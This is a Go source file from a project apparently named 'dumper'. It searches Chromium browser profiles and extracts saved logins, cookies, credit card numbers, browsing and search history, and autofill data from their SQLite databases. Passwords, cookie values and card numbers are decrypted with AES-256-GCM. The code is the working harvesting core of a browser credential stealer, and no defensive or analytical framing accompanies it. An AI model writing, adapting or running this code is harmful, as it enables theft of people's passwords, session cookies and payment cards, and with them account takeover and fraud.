package chromium

import (
	"database/sql"

	"dumper/crypt"
	"dumper/file"

	_ "github.com/mattn/go-sqlite3"
)

func sqlQuery(p1 string, p2 string, stmt string, f func(rows *sql.Rows)) {
	for _, profile := range []string{"\\", "\\Default\\", "\\Profile 1\\", "\\Profile 2\\", "\\Profile 3\\", "\\Profile 4\\", "\\Profile 5\\"} {
		dbPath := p1 + profile + p2

		if file.PathExists(dbPath) {
			tempDbPath := file.Temp + "\\" + randHex(10)
			file.CopyFile(dbPath, tempDbPath)

			db, err := sql.Open("sqlite3", tempDbPath)
			if err != nil {
				panic(err)
			}

			rows, err := db.Query(stmt)
			if err != nil {
				panic(err)
			}

			f(rows)

			db.Close()
			file.DeleteFile(tempDbPath)
		}
	}
}

func queryAccounts(p string, key []byte) []Account {
	var accounts []Account

	sqlQuery(p, "Login Data", "SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins", func(rows *sql.Rows) {
		for rows.Next() {
			var acc Account
			var date, lastUsed int

			err := rows.Scan(&acc.Origin, &acc.Action, &acc.User, &acc.Pass, &date, &lastUsed)
			if err != nil {
				panic(err)
			}

			acc.Date = chromeTimeToDateTime(date)
			acc.LastUsed = chromeTimeToDateTime(lastUsed)

			acc.Pass = string(crypt.Aes256GcmDecrypt(key, []byte(acc.Pass)))
			accounts = append(accounts, acc)
		}
	})

	return accounts
}

func queryCookies(p string, key []byte) []Cookie {
	var cookies []Cookie

	sqlQuery(p, "Network\\Cookies", "SELECT host_key, name, path, encrypted_value, expires_utc, is_secure FROM cookies", func(rows *sql.Rows) {
		for rows.Next() {
			var cookie Cookie

			err := rows.Scan(&cookie.Host, &cookie.Name, &cookie.Path, &cookie.Value, &cookie.Expires, &cookie.IsSecure)
			if err != nil {
				panic(err)
			}

			cookie.Value = string(crypt.Aes256GcmDecrypt(key, []byte(cookie.Value)))
			cookies = append(cookies, cookie)
		}
	})

	return cookies
}

func queryWebHistory(p string) []WebHistory {
	var history []WebHistory

	sqlQuery(p, "History", "SELECT urls.url, urls.title, urls.visit_count, urls.last_visit_time FROM urls, visits WHERE urls.id = visits.url ORDER BY urls.last_visit_time", func(rows *sql.Rows) {
		for rows.Next() {
			var h WebHistory

			var lastVisit int

			err := rows.Scan(&h.Url, &h.Title, &h.VisitCount, &lastVisit)
			if err != nil {
				panic(err)
			}

			h.LastVisit = chromeTimeToDateTime(lastVisit)

			history = append(history, h)
		}
	})

	return history
}

func querySearchHistory(p string) []SearchHistory {
	var history []SearchHistory

	sqlQuery(p, "History", "SELECT term FROM keyword_search_terms", func(rows *sql.Rows) {
		for rows.Next() {
			var h SearchHistory

			err := rows.Scan(&h.Term)
			if err != nil {
				panic(err)
			}

			history = append(history, h)
		}
	})

	return history
}

func queryCreditCards(p string, key []byte) []CreditCard {
	var creditCards []CreditCard

	sqlQuery(p, "Web Data", "SELECT card_number_encrypted, name_on_card, expiration_month, expiration_year FROM credit_cards", func(rows *sql.Rows) {
		for rows.Next() {
			var creditCard CreditCard

			err := rows.Scan(&creditCard.Number, &creditCard.Name, &creditCard.ExpirationMonth, &creditCard.ExpirationYear)
			if err != nil {
				panic(err)
			}

			creditCard.Number = string(crypt.Aes256GcmDecrypt(key, []byte(creditCard.Number)))

			creditCards = append(creditCards, creditCard)
		}
	})

	return creditCards
}

func queryAutofill(p string) []Autofill {
	var autofill []Autofill

	sqlQuery(p, "Web Data", "SELECT name, value, date_created, date_last_used FROM autofill", func(rows *sql.Rows) {
		for rows.Next() {
			var a Autofill

			var created, lastUsed int

			err := rows.Scan(&a.Name, &a.Value, &created, &lastUsed)
			if err != nil {
				panic(err)
			}

			a.Created = chromeTimeToDateTime(created)
			a.LastUsed = chromeTimeToDateTime(lastUsed)

			autofill = append(autofill, a)
		}
	})

	return autofill
}
